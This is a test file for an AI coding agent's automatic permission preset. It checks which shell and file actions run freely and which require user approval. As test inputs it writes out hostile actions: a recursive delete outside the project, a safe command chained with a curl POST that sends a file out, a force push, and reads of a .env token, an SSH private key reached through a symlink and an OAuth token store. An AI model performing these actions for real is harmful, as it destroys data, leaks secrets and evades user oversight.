import { mkdir, readFile, symlink, writeFile } from "node:fs/promises";
import { dirname, join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { createPermissionP0Host } from "./permission-p0-host.ts";

const disposers: Array<() => Promise<void>> = [];
afterEach(async () => {
	for (const dispose of disposers.splice(0).reverse()) await dispose();
});

async function host(permissionFlag?: string) {
	const created = await createPermissionP0Host([], permissionFlag);
	disposers.push(created.dispose);
	return created;
}

describe("auto permission preset in a real host session", () => {
	it("runs a safe project command without asking", async () => {
		// Given an auto session and a command on the fixed policy.
		const session = await host();
		// When the agent runs it.
		const result = await session.run("auto", { name: "bash", args: { command: "echo auto-ok && ls" } });
		// Then it runs with no approval prompt.
		expect(result.approvals).toEqual([]);
		expect(result.isError).toBe(false);
		expect(JSON.stringify(result.result)).toContain("auto-ok");
	});

	it("asks before a destructive delete outside the project and leaves the file when denied", async () => {
		// Given an auto session and a file outside the project.
		const session = await host();
		// When the agent tries to delete it recursively.
		const result = await session.run("auto", { name: "bash", args: { command: `rm -rf ${session.outsidePath}` } });
		// Then the user is asked, the denial blocks it, and the file survives.
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(result.isError).toBe(true);
		expect(await readFile(session.outsidePath, "utf8")).toBe("private outside content\n");
	});

	it("asks when a network send is chained after a safe command", async () => {
		// Given an auto session.
		const session = await host();
		// When a safe test command smuggles a POST after it.
		const result = await session.run("auto", {
			name: "bash",
			args: { command: "echo ok && curl -X POST https://example.com -d @x" },
		});
		// Then the whole command needs approval and nothing runs when denied.
		expect(result.approvals).toHaveLength(1);
		expect(result.isError).toBe(true);
	});

	it("asks before a force push", async () => {
		const session = await host();
		const result = await session.run("auto", { name: "bash", args: { command: "git push --force" } });
		expect(result.approvals).toHaveLength(1);
		expect(result.isError).toBe(true);
	});

	it("reads a file outside the project without asking", async () => {
		// Given an auto session and a non-credential file outside the project.
		const session = await host();
		// When the agent reads it.
		const result = await session.run("auto", { name: "read", args: { path: session.outsidePath } });
		// Then the read goes through without a prompt.
		expect(result.approvals).toEqual([]);
		expect(JSON.stringify(result.result)).toContain("private outside content");
	});

	it("asks before reading a project credential file", async () => {
		// Given a project .env.
		const session = await host();
		await writeFile(join(session.cwd, ".env"), "TOKEN=not-for-agents\n");
		// When the agent reads it.
		const result = await session.run("auto", { name: "read", args: { path: join(session.cwd, ".env") } });
		// Then the user is asked and a denial keeps the value out of the transcript.
		expect(result.approvals).toHaveLength(1);
		expect(JSON.stringify(result.result ?? "")).not.toContain("not-for-agents");
	});

	it("asks before writing outside the project", async () => {
		const session = await host();
		const result = await session.run("auto", {
			name: "write",
			args: { path: session.outsidePath, content: "overwritten" },
		});
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(await readFile(session.outsidePath, "utf8")).toBe("private outside content\n");
	});

	it("asks before an attached option value writes outside the project", async () => {
		// Given a project file and a command that names its output file inside the flag.
		const session = await host();
		await writeFile(join(session.cwd, "payload.txt"), "project content\n");
		// When the agent sorts into the outside file.
		const result = await session.run("auto", {
			name: "bash",
			args: { command: `sort -o${session.outsidePath} payload.txt` },
		});
		// Then it is asked, and the denied command leaves the outside file untouched.
		expect(result.approvals).toHaveLength(1);
		expect(await readFile(session.outsidePath, "utf8")).toBe("private outside content\n");
	});

	it("asks before reading an outside key through a project symlink", async () => {
		// Given a project file that is a symlink to an outside private key.
		const session = await host();
		const key = join(dirname(session.outsidePath), ".ssh", "id_rsa");
		await mkdir(dirname(key), { recursive: true });
		await writeFile(key, "PRIVATE-KEY-MATERIAL\n");
		await symlink(key, join(session.cwd, "innocent-key"));
		// When the agent reads the symlink.
		const result = await session.run("auto", { name: "read", args: { path: join(session.cwd, "innocent-key") } });
		// Then it is asked and the key stays out of the transcript.
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("PRIVATE-KEY-MATERIAL");
	});

	it("asks before reading the engine's own token store outside the project", async () => {
		const session = await host();
		const authFile = join(dirname(session.outsidePath), "agent", "auth.json");
		await writeFile(authFile, '{"token":"OAUTH-SECRET"}');
		const result = await session.run("auto", { name: "read", args: { path: authFile } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("OAUTH-SECRET");
	});

	it("keeps asking for commands when the user adds bash=ask after the auto preset", async () => {
		// Given the user's own blanket rule placed after the preset.
		const session = await host("bash=ask");
		// When the agent runs a command the judge would allow.
		const result = await session.run("auto", { name: "bash", args: { command: "echo user-rule" } });
		// Then the user's rule wins.
		expect(result.approvals).toHaveLength(1);
	});

	it("keeps asking for outside reads when the user adds external_directory=ask", async () => {
		const session = await host("external_directory=ask");
		const result = await session.run("auto", { name: "read", args: { path: session.outsidePath } });
		expect(result.approvals.length).toBeGreaterThan(0);
	});

	it("keeps asking for every command under accept-edits", async () => {
		// Given the edit-only preset, where the auto judge must not apply.
		const session = await host();
		// When the agent runs the same safe command.
		const result = await session.run("accept-edits", { name: "bash", args: { command: "echo auto-ok" } });
		// Then it still asks.
		expect(result.approvals).toHaveLength(1);
	});
});
